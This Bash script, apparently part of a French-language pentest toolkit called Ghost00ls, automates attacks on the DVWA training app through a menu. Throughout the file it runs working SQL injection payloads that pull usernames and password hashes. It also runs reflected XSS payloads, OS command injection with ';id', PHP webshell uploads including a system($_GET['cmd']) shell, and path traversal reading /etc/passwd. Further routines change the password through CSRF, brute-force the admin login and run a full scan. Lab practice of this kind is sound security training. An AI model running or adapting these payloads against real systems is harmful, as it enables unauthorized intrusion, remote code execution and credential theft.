#!/bin/bash
# modules/labs/dvwa/exploits.sh - Enterprise Grade
# Version: 4.0 - Ghost00ls Professional Edition

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/dvwa_exploits"
mkdir -p "$LOG_DIR"

detect_security_level() {
    local cookie_jar="$1"
    local base_url="$2"
    local resp=$(curl -s -b "$cookie_jar" "${base_url}/security.php" 2>/dev/null)
    
    # Méthode 1: Chercher option selected
    if echo "$resp" | grep -i "option.*selected" | grep -qi "low"; then
        echo "low"
    elif echo "$resp" | grep -i "option.*selected" | grep -qi "medium"; then
        echo "medium"
    elif echo "$resp" | grep -i "option.*selected" | grep -qi "high"; then
        echo "high"
    # Méthode 2: Chercher select name=security
    elif echo "$resp" | grep -A 5 'name="security"' | grep -qi 'value="low".*selected'; then
        echo "low"
    elif echo "$resp" | grep -A 5 'name="security"' | grep -qi 'value="medium".*selected'; then
        echo "medium"
    elif echo "$resp" | grep -A 5 'name="security"' | grep -qi 'value="high".*selected'; then
        echo "high"
    # Méthode 3: Fallback - forcer low par défaut
    else
        echo "low"
    fi
}

init_dvwa_session() {
    local cookie_jar="$1"
    local base_url="$2"
    
    echo -e "${YELLOW}Initialisation session DVWA...${NC}"
    curl -s -b "$cookie_jar" -c "$cookie_jar" "${base_url}/index.php" >/dev/null 2>&1
    sleep 1
    curl -s -b "$cookie_jar" -c "$cookie_jar" -X POST -d "security=low&seclev_submit=Submit" "${base_url}/security.php" >/dev/null 2>&1
    sleep 1
    
    local level=$(detect_security_level "$cookie_jar" "$base_url")
    echo -e "${CYAN}Security Level: $level${NC}"
    
    if [ "$level" = "low" ]; then
        return 0
    else
        echo -e "${YELLOW}Attention: Security Level actuel est $level au lieu de low${NC}"
        return 1
    fi
}

force_security_low() {
    init_dvwa_session "$1" "$2"
}

exploit_sqli() {
    clear
    banner
    echo -e "${MAGENTA}[SQL Injection - Detection Avancee]${NC}"
    echo -e "${CYAN}Objectif : Extraction de donnees via SQLi${NC}"
    echo -e "${YELLOW}Risque : Fuite de donnees sensibles${NC}"
    echo -e "${GREEN}Mitigation : Prepared statements${NC}"
    echo
    
    check_tools curl || { read -p "Entree..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "IP [$IP]: " input; IP=${input:-$IP}
    read -p "Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    echo -e "\n${YELLOW}Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    local session=$(echo "$result" | cut -d'|' -f2)
    
    if [ -z "$session" ]; then
        echo -e "${RED}Echec authentification${NC}"
        read -p "Entree..."
        return
    fi
    
    echo -e "${GREEN}Authentifie${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"
    
    echo -e "\n${YELLOW}Test SQLi avec 5 payloads...${NC}\n"
    
    local success=0
    
    # Payloads CORRECTEMENT encodes
    local payload1="1%27+OR+%271%27%3D%271"
    local payload2="1%27+OR+1%3D1+%23"
    local payload3="%27+OR+%271%27%3D%271"
    local payload4="1%27+UNION+SELECT+null%2C+user+FROM+users+%23"
    local payload5="1%27+UNION+SELECT+null%2C+database%28%29+%23"
    
    local name1="1' OR '1'='1"
    local name2="1' OR 1=1 #"
    local name3="' OR '1'='1"
    local name4="1' UNION SELECT null, user FROM users #"
    local name5="1' UNION SELECT null, database() #"
    
    local all_payloads=("$payload1" "$payload2" "$payload3" "$payload4" "$payload5")
    local all_names=("$name1" "$name2" "$name3" "$name4" "$name5")
    
    local idx=0
    for encoded in "${all_payloads[@]}"; do
        local payload_name="${all_names[$idx]}"
        local url="${BASE}/vulnerabilities/sqli/?id=${encoded}&Submit=Submit"
        
        echo -e "${CYAN}================================${NC}"
        echo -e "${CYAN}Payload [$((idx+1))/5]: $payload_name${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        local has_data=0
        local findings=""
        
        # Critere 1: Presence de "admin"
        if grep -qi "admin" "$tmpf"; then
            findings="${findings}\n  Admin detecte"
            has_data=1
        fi
        
        # Critere 2: Autres usernames DVWA
        if grep -qi "gordon\|pablo\|hack\|bob\|smith" "$tmpf"; then
            findings="${findings}\n  Autres users detectes"
            has_data=1
        fi
        
        # Critere 3: Structure SQL
        if grep -qi "First name\|Surname\|ID:" "$tmpf"; then
            findings="${findings}\n  Structure SQL detectee"
            has_data=1
        fi
        
        # Critere 4: Hash MD5
        if grep -oE "[a-f0-9]{32}" "$tmpf" >/dev/null 2>&1; then
            findings="${findings}\n  Hash MD5 detecte"
            has_data=1
        fi
        
        # Critere 5: Nom database
        if grep -qi "dvwa\|information_schema\|database" "$tmpf"; then
            findings="${findings}\n  Info database detectee"
            has_data=1
        fi
        
        if [ $has_data -eq 1 ]; then
            echo -e "$findings"
            echo -e "\n${GREEN}==============================${NC}"
            echo -e "${GREEN}SQLi SUCCESS - Donnees extraites !${NC}"
            echo -e "${GREEN}==============================${NC}"
            log_exploit "${LOG_DIR}/sqli.log" "SUCCESS" "SQLi: $payload_name"
            
            echo -e "\n${CYAN}Extrait des donnees:${NC}"
            echo -e "${CYAN}================================${NC}"
            
            # Afficher tous les utilisateurs detectes
            echo -e "${GREEN}Utilisateurs DVWA:${NC}"
            grep -ioE "admin|gordon|pablo|hack|bob|smith|brown|picasso|me" "$tmpf" | sort -u | sed 's/^/   - /'
            
            # Afficher les hash MD5
            local hashes=$(grep -oE "[a-f0-9]{32}" "$tmpf" | head -n 5)
            if [ -n "$hashes" ]; then
                echo -e "\n${GREEN}Hash MD5 trouves:${NC}"
                echo "$hashes" | sed 's/^/   - /'
            fi
            
            # Afficher structure SQL si presente
            if grep -qi "First name\|Surname" "$tmpf"; then
                echo -e "\n${GREEN}Structure SQL:${NC}"
                grep -A 1 "First name\|Surname" "$tmpf" | head -n 10 | sed 's/^/   /'
            fi
            
            # Afficher info database
            if grep -qi "dvwa\|database" "$tmpf"; then
                echo -e "\n${GREEN}Database info:${NC}"
                grep -io "dvwa\|information_schema\|mysql" "$tmpf" | sort -u | sed 's/^/   - /'
            fi
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "  ${YELLOW}Aucune donnee detectee${NC}"
            
            # Debug simple
            if grep -qi "error\|warning\|syntax" "$tmpf"; then
                echo -e "  ${RED}Erreur SQL detectee${NC}"
            fi
        fi
        
        rm -f "$tmpf"
        idx=$((idx+1))
    done
    
    if [ $success -eq 0 ]; then
        echo -e "\n${RED}==============================${NC}"
        echo -e "${RED}Aucun payload n'a fonctionne${NC}"
        echo -e "${RED}==============================${NC}"
        echo -e "${YELLOW}Actions de debug:${NC}"
        echo -e "   1. Verifie Security Level = Low dans DVWA"
        echo -e "   2. Teste manuellement dans le navigateur"
        echo -e "   3. URL test: ${BASE}/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "\nEntree..."
}

exploit_xss() {
    clear
    banner
    echo -e "${MAGENTA}[XSS Reflected]${NC}"
    echo -e "${CYAN}Objectif : Injection de scripts${NC}"
    echo -e "${YELLOW}Risque : Session hijacking${NC}"
    echo -e "${GREEN}Mitigation : Output encoding, CSP${NC}"
    echo
    
    check_tools curl || { read -p "Entree..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "IP [$IP]: " input; IP=${input:-$IP}
    read -p "Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    init_dvwa_session "$cookie_jar" "$BASE"
    
    echo -e "\n${YELLOW}Test XSS avec 7 payloads...${NC}\n"
    
    local payloads=(
        '<script>alert(1)</script>'
        '<img src=x onerror=alert(1)>'
        '<svg onload=alert(1)>'
        '"><script>alert(1)</script>'
        '<iframe src=javascript:alert(1)>'
        '<body onload=alert(1)>'
        '<input onfocus=alert(1) autofocus>'
    )
    
    local success=0
    local idx=1
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/vulnerabilities/xss_r/?name=${enc}"
        
        echo -e "${CYAN}Payload [$idx/7]: ${payload:0:40}${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        local is_vuln=0
        
        if grep -F "$payload" "$tmpf" >/dev/null 2>&1; then
            is_vuln=1
        fi
        
        if grep -q "<script" "$tmpf" || grep -q "onerror" "$tmpf" || grep -q "onload" "$tmpf"; then
            is_vuln=1
        fi
        
        if [ $is_vuln -eq 1 ]; then
            echo -e "${GREEN}XSS SUCCESS !${NC}"
            log_exploit "${LOG_DIR}/xss.log" "SUCCESS" "XSS: ${payload:0:40}"
            
            echo -e "\n${CYAN}Contexte:${NC}"
            grep -o ".{0,60}${payload:0:15}.{0,60}" "$tmpf" 2>/dev/null | head -n 2 | sed 's/^/   /'
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}Bloque${NC}"
        fi
        
        rm -f "$tmpf"
        idx=$((idx+1))
    done
    
    if [ $success -eq 0 ]; then
        echo -e "\n${RED}Tous bloques${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "\nEntree..."
}

exploit_cmdinj() {
    clear
    banner
    echo -e "${MAGENTA}[Command Injection]${NC}"
    echo -e "${CYAN}Objectif : Execution commandes OS${NC}"
    echo -e "${YELLOW}Risque : RCE${NC}"
    echo -e "${GREEN}Mitigation : Input validation${NC}"
    echo
    
    check_tools curl || { read -p "Entree..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "IP [$IP]: " input; IP=${input:-$IP}
    read -p "Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    init_dvwa_session "$cookie_jar" "$BASE"
    
    echo -e "\n${YELLOW}Test Command Injection...${NC}\n"
    
    local success=0
    local payload_list=(
        "127.0.0.1%3Bid"
        "127.0.0.1%3B+id"
        "127.0.0.1+%26%26+id"
        "127.0.0.1+%7C+id"
        "127.0.0.1%0Aid"
    )
    
    local payload_names=(
        "127.0.0.1;id"
        "127.0.0.1; id"
        "127.0.0.1 && id"
        "127.0.0.1 | id"
        "127.0.0.1 newline id"
    )
    
    local idx=0
    for encoded in "${payload_list[@]}"; do
        local url="${BASE}/vulnerabilities/exec/?ip=${encoded}&Submit=Submit"
        
        echo -e "${CYAN}Payload [$((idx+1))/5]: ${payload_names[$idx]}${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        if grep -q "uid=" "$tmpf" || grep -qi "www-data\|root" "$tmpf"; then
            echo -e "${GREEN}Command Injection SUCCESS !${NC}"
            log_exploit "${LOG_DIR}/cmdinj.log" "SUCCESS" "CmdInj: ${payload_names[$idx]}"
            
            echo -e "\n${CYAN}Output:${NC}"
            grep -A 3 "uid=\|www-data" "$tmpf" | head -n 5 | sed 's/^/   /'
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}Pas d'exec${NC}"
        fi
        
        rm -f "$tmpf"
        idx=$((idx+1))
    done
    
    if [ $success -eq 0 ]; then
        echo -e "\n${RED}Aucune execution${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "\nEntree..."
}

exploit_upload() {
    clear
    banner
    echo -e "${MAGENTA}[File Upload]${NC}"
    echo -e "${CYAN}Objectif : Upload webshell${NC}"
    echo -e "${YELLOW}Risque : RCE via webshell${NC}"
    echo -e "${GREEN}Mitigation : Type validation${NC}"
    echo
    
    check_tools curl || { read -p "Entree..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "IP [$IP]: " input; IP=${input:-$IP}
    read -p "Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    init_dvwa_session "$cookie_jar" "$BASE"
    
    local workdir=$(mktemp -d)
    
    echo '<?php echo "GHOST_SHELL_OK_".php_uname()."_END"; ?>' > "${workdir}/shell.php"
    echo 'GIF89a<?php system($_GET["cmd"]); ?>' > "${workdir}/shell.php.jpg"
    
    echo -e "\n${YELLOW}Test upload...${NC}\n"
    
    local files=("shell.php" "shell.php.jpg")
    local success=0
    
    for file in "${files[@]}"; do
        local filepath="${workdir}/${file}"
        
        echo -e "${CYAN}Upload: $file${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 \
            -F "uploaded=@${filepath};filename=${file}" \
            -F "Upload=Upload" \
            "${BASE}/vulnerabilities/upload/" > "$tmpf" 2>/dev/null
        
        if grep -qi "successfully uploaded" "$tmpf"; then
            echo -e "${GREEN}Upload SUCCESS${NC}"
            
            local test_url="${BASE}/hackable/uploads/${file}"
            local exec_resp=$(curl -s --max-time 5 "$test_url" 2>/dev/null)
            
            if echo "$exec_resp" | grep -q "GHOST_SHELL_OK"; then
                echo -e "${GREEN}Execution confirmee !${NC}"
                echo -e "${CYAN}URL: $test_url${NC}"
                log_exploit "${LOG_DIR}/upload.log" "SUCCESS" "Upload: $file"
                success=1
                break
            fi
        else
            echo -e "${RED}Upload refuse${NC}"
        fi
        
        rm -f "$tmpf"
    done
    
    if [ $success -eq 0 ]; then
        echo -e "\n${RED}Aucun upload reussi${NC}"
    fi
    
    rm -rf "$workdir"
    cleanup_cookie_jar "$cookie_jar"
    read -p "\nEntree..."
}

exploit_lfi() {
    clear
    banner
    echo -e "${MAGENTA}[LFI - Local File Inclusion]${NC}"
    echo -e "${CYAN}Objectif : Lecture fichiers${NC}"
    echo -e "${YELLOW}Risque : Info disclosure${NC}"
    echo -e "${GREEN}Mitigation : Path validation${NC}"
    echo
    
    check_tools curl || { read -p "Entree..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "IP [$IP]: " input; IP=${input:-$IP}
    read -p "Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    init_dvwa_session "$cookie_jar" "$BASE"
    
    echo -e "\n${YELLOW}Test LFI...${NC}\n"
    
    local payload_list=(
        "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
        "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts"
    )
    
    local payload_names=(
        "/etc/passwd"
        "/etc/hosts"
    )
    
    local success=0
    local idx=0
    
    for encoded in "${payload_list[@]}"; do
        local url="${BASE}/vulnerabilities/fi/?page=${encoded}"
        
        echo -e "${CYAN}Payload: ${payload_names[$idx]}${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        if grep -q "root:x:0:0" "$tmpf" || grep -q "127.0.0.1.*localhost" "$tmpf"; then
            echo -e "${GREEN}LFI SUCCESS !${NC}"
            log_exploit "${LOG_DIR}/lfi.log" "SUCCESS" "LFI: ${payload_names[$idx]}"
            
            echo -e "\n${CYAN}Extrait:${NC}"
            head -n 10 "$tmpf" | grep -v "^$" | sed 's/^/   /'
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}Non accessible${NC}"
        fi
        
        rm -f "$tmpf"
        idx=$((idx+1))
    done
    
    if [ $success -eq 0 ]; then
        echo -e "\n${RED}Aucun fichier accessible${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "\nEntree..."
}

exploit_csrf() {
    clear
    banner
    echo -e "${MAGENTA}[CSRF]${NC}"
    echo -e "${CYAN}Objectif : Action non autorisee${NC}"
    echo -e "${YELLOW}Risque : Actions victime${NC}"
    echo -e "${GREEN}Mitigation : CSRF tokens${NC}"
    echo
    
    check_tools curl || { read -p "Entree..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "IP [$IP]: " input; IP=${input:-$IP}
    read -p "Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    init_dvwa_session "$cookie_jar" "$BASE"
    
    echo -e "\n${YELLOW}Test CSRF...${NC}\n"
    
    local tmpf=$(mktemp)
    curl -s -b "$cookie_jar" "${BASE}/vulnerabilities/csrf/" > "$tmpf" 2>/dev/null
    
    local has_token=$(grep -o "user_token" "$tmpf")
    
    if [ -z "$has_token" ]; then
        echo -e "${GREEN}Pas de token - VULNERABLE${NC}"
    else
        echo -e "${YELLOW}Token present${NC}"
    fi
    
    rm -f "$tmpf"
    
    echo -e "\n${YELLOW}Changement password sans token...${NC}"
    
    local resp=$(curl -s -b "$cookie_jar" "${BASE}/vulnerabilities/csrf/?password_new=ghost123&password_conf=ghost123&Change=Change")
    
    if echo "$resp" | grep -qi "changed\|successfully"; then
        echo -e "${GREEN}CSRF SUCCESS !${NC}"
        echo -e "${CYAN}Password change: ghost123${NC}"
        log_exploit "${LOG_DIR}/csrf.log" "SUCCESS" "CSRF"
    else
        echo -e "${YELLOW}Protection active${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "\nEntree..."
}

exploit_bruteforce() {
    clear
    banner
    echo -e "${MAGENTA}[Brute Force]${NC}"
    echo -e "${CYAN}Objectif : Casser password${NC}"
    echo -e "${YELLOW}Risque : Acces non autorise${NC}"
    echo -e "${GREEN}Mitigation : Rate limiting${NC}"
    echo
    
    check_tools curl || { read -p "Entree..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "IP [$IP]: " input; IP=${input:-$IP}
    read -p "Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    local passwords=("password" "admin" "123456" "letmein" "Password1" "admin123")
    
    echo -e "\n${YELLOW}Test Brute Force...${NC}"
    echo -e "${CYAN}Target: admin${NC}"
    echo -e "${CYAN}Wordlist: ${#passwords[@]} passwords${NC}\n"
    
    local success=0
    local idx=1
    
    for pass in "${passwords[@]}"; do
        echo -e "${CYAN}Test [$idx/${#passwords[@]}]: admin / $pass${NC}"
        
        local cookie_jar=$(create_cookie_jar)
        local result=$(login_form "${BASE}/login.php" "admin" "$pass")
        local session=$(echo "$result" | cut -d'|' -f2)
        
        if [ -n "$session" ]; then
            local resp=$(curl -s -b "$cookie_jar" "${BASE}/index.php" 2>/dev/null)
            
            if echo "$resp" | grep -qi "Logout\|Welcome.*admin"; then
                echo -e "\n${GREEN}BRUTE FORCE SUCCESS !${NC}"
                echo -e "${CYAN}Credentials: admin / $pass${NC}"
                log_exploit "${LOG_DIR}/bruteforce.log" "SUCCESS" "admin/$pass"
                success=1
                cleanup_cookie_jar "$cookie_jar"
                break
            fi
        fi
        
        cleanup_cookie_jar "$cookie_jar"
        idx=$((idx+1))
        sleep 0.5
    done
    
    if [ $success -eq 0 ]; then
        echo -e "\n${YELLOW}Aucun password trouve${NC}"
    fi
    
    read -p "\nEntree..."
}

full_scan() {
    clear
    banner
    echo -e "${MAGENTA}[Full Scan DVWA]${NC}\n"
    
    local IP PORT
    IP=$(get_host_ip)
    
    read -p "IP [$IP]: " input; IP=${input:-$IP}
    read -p "Port [8081]: " PORT; PORT=${PORT:-8081}
    
    echo -e "\n${YELLOW}Scan en cours...${NC}\n"
    
    local report="${LOG_DIR}/scan_$(date +%Y%m%d_%H%M%S).txt"
    
    echo "DVWA Full Scan" | tee "$report"
    echo "Date: $(date)" | tee -a "$report"
    echo "Target: http://${IP}:${PORT}" | tee -a "$report"
    echo "==============================" | tee -a "$report"
    
    local result=$(login_form "http://${IP}:${PORT}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    init_dvwa_session "$cookie_jar" "http://${IP}:${PORT}"
    
    echo "[1/5] SQLi..." | tee -a "$report"
    curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit" | grep -q "admin" && echo "SQLi: VULN" | tee -a "$report" || echo "SQLi: OK" | tee -a "$report"
    
    echo "[2/5] XSS..." | tee -a "$report"
    curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" | grep -q "<script>alert" && echo "XSS: VULN" | tee -a "$report" || echo "XSS: OK" | tee -a "$report"
    
    echo "[3/5] CmdInj..." | tee -a "$report"
    curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/exec/?ip=127.0.0.1%3Bid&Submit=Submit" | grep -q "uid=" && echo "CmdInj: VULN" | tee -a "$report" || echo "CmdInj: OK" | tee -a "$report"
    
    echo "[4/5] LFI..." | tee -a "$report"
    curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" | grep -q "root:x:0" && echo "LFI: VULN" | tee -a "$report" || echo "LFI: OK" | tee -a "$report"
    
    echo "[5/5] CSRF..." | tee -a "$report"
    curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/csrf/" | grep -qv "user_token" && echo "CSRF: VULN" | tee -a "$report" || echo "CSRF: OK" | tee -a "$report"
    
    echo "==============================" | tee -a "$report"
    echo "Rapport: $report"
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "\nEntree..."
}

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}=== Exploits DVWA v4.0 ===${NC}"
        echo
        echo -e "${GREEN}1) SQL Injection${NC}"
        echo -e "${GREEN}2) XSS Reflected${NC}"
        echo -e "${GREEN}3) Command Injection${NC}"
        echo -e "${GREEN}4) File Upload${NC}"
        echo -e "${GREEN}5) LFI${NC}"
        echo -e "${GREEN}6) CSRF${NC}"
        echo -e "${GREEN}7) Brute Force${NC}"
        echo -e "${CYAN}8) Full Scan${NC}"
        echo -e "${MAGENTA}9) Logs${NC}"
        echo -e "${RED}0) Retour${NC}"
        echo
        read -p "Choix : " choice

        case $choice in
            1) exploit_sqli ;;
            2) exploit_xss ;;
            3) exploit_cmdinj ;;
            4) exploit_upload ;;
            5) exploit_lfi ;;
            6) exploit_csrf ;;
            7) exploit_bruteforce ;;
            8) full_scan ;;
            9) 
                clear
                banner
                echo -e "${CYAN}=== Logs ===${NC}\n"
                for log in "$LOG_DIR"/*.log; do
                    [ -f "$log" ] && echo "=== $(basename "$log") ===" && tail -n 5 "$log" && echo
                done
                read -p "Entree..."
                ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
